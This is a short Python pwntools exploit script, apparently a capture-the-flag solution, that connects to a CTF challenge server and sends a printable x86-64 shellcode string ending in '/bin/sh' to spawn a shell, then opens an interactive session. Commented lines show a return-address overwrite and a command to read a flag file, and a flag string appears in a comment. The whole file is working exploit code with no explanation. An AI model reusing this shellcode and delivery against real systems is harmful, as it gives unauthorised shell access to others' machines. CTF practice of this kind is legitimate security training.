#!/usr/bin/env python
from pwn import *

# AD{S0meth1ng_usefu1_0n_7he_st4ck!}

host , port = 'ctf.yuawn.idv.tw' , 10110
#host , port = '192.168.78.135' , 4000
y = remote( host , port )

name = 0x6010a0

sc = 'j;X4;PP^ZXXXXXXXXXXXXh4>;;XH5;;;;PXXXXj;XT_j;YYY' + 'D' * 0x20 + '/bin/sh' 

print len( sc )

y.sendafter( ']:' , sc )

#y.send( 'D' * 0x18 + p64( name ) )

sleep(1)

#y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()